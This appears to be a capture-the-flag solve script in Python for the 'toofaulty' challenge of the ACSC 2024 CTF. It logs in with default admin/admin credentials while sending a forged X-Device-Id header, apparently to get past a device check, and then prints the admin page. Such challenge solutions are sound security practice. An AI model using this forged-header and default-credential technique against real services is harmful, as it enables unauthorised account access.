import requests

BASE_URL = "http://toofaulty.chal.2024.ctf.acsc.asia"

login_credentials = {
    "username": "admin",
    "password": "admin"
}

session = requests.Session()

session.headers.update(
    {"X-Device-Id": "2ddab7dd181163babbbae9626c05d05c3c1d0b26"})

login_response = session.post(f"{BASE_URL}/login", data=login_credentials)

if login_response.ok:
    print("Login successful.")

    root_response = session.get(f"{BASE_URL}/")

    if root_response.ok:
        print("Accessed the root page with admin session.")
        print(root_response.text)
    else:
        print("Failed to access the root page.")
else:
    print("Login failed. Status code:", login_response.status_code)
